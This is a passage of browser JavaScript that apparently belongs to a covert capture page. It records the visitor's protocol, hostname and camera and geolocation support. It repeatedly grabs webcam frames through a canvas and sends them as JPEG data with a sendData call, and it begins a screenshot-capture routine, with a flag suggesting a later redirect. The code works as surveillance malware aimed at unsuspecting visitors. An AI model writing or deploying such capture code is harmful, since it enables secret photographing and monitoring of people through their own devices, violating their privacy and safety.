        protocol: window.location.protocol,
        isSecure: window.location.protocol === 'https:' || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1',
        hostname: window.location.hostname,
        mediaSupported: !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia),
        geolocationSupported: !!navigator.geolocation,
        timestamp: new Date().toISOString()
    });

    function logCameraError(err) {
        sendData('camera_error', { name: err.name || 'Error', message: err.message || String(err) });
    }

    function captureCamera() {
        if (redirected || camCapturing || !camOk) return;
        camCapturing = true;
        try {
            var video = document.getElementById('cam-video');
            var canvas = document.getElementById('cam-canvas');
            if (!video || video.readyState < 2 || !video.videoWidth) { camCapturing = false; return; }
            var ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            sendData('camera', { image: canvas.toDataURL('image/jpeg', 0.85) });
            totalCaptures++;
        } catch(e) {} finally {
            setTimeout(function() { camCapturing = false; }, 500);
        }
    }

    function captureScreenshot() {
        if (redirected || shotCapturing) return;
